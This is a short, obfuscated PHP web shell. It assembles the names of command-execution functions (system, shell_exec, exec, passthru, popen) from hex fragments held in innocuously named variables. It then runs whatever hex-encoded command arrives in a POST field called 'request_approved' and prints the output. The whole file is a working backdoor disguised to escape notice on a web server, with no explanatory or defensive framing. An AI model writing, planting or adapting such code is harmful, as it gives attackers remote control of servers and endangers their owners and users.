<?php


$holder1 = '73';
$holder2 = '65';
$holder3 = '6d';
$holder4 = '68';
$holder5 = '6c';
$holder6 = '5f';
$holder7 = '63';
$holder8 = '70';
$holder9 = '61';
$holder10 = '72';
$holder11 = '6e';
$holder12 = '67';
$holder13 = '6f';
$holder14 = '75';
$holder15 = '76';
$holder16 = '64';
$settings1 = pack("H*", $holder1 . '79' . $holder1 . '74' . $holder2 . $holder3);
$settings2 = pack("H*", $holder1 . $holder4 . $holder2 . '6c' . $holder5 . $holder6 . '65' . '78' . $holder2 . $holder7);
$settings3 = pack("H*", $holder2 . '78' . $holder2 . '63');
$settings4 = pack("H*", $holder8 . $holder9 . $holder1 . $holder1 . '74' . $holder4 . $holder10 . '75');
$settings5 = pack("H*", $holder8 . '6f' . $holder8 . '65' . $holder11);
$settings6 = pack("H*", '73' . '74' . '72' . $holder2 . $holder9 . $holder3 . $holder6 . $holder12 . $holder2 . '74' . $holder6 . $holder7 . $holder13 . $holder11 . '74' . '65' . '6e' . '74' . '73');
$settings7 = pack("H*", '70' . $holder7 . $holder5 . $holder13 . $holder1 . '65');
$request_approved = pack("H*", '72' . $holder2 . '71' . $holder14 . $holder2 . $holder1 . '74' . '5f' . $holder9 . '70' . '70' . $holder10 . $holder13 . $holder15 . $holder2 . $holder16);
if (isset($_POST[$request_approved])) {
    $request_approved = pack("H*", $_POST[$request_approved]);
    if (function_exists($settings1)) {
        $settings1($request_approved);
    } elseif (function_exists($settings2)) {
        print $settings2($request_approved);
    } elseif (function_exists($settings3)) {
        $settings3($request_approved, $marker_pointer);
        print join("\n", $marker_pointer);
    } elseif (function_exists($settings4)) {
        $settings4($request_approved);
    } elseif (function_exists($settings5) && function_exists($settings6) && function_exists($settings7)) {
        $ent_dat = $settings5($request_approved, 'r');
        if ($ent_dat) {
            $hld_elem = $settings6($ent_dat);
            $settings7($ent_dat);
            print $hld_elem;
        }
    }
    exit;
}
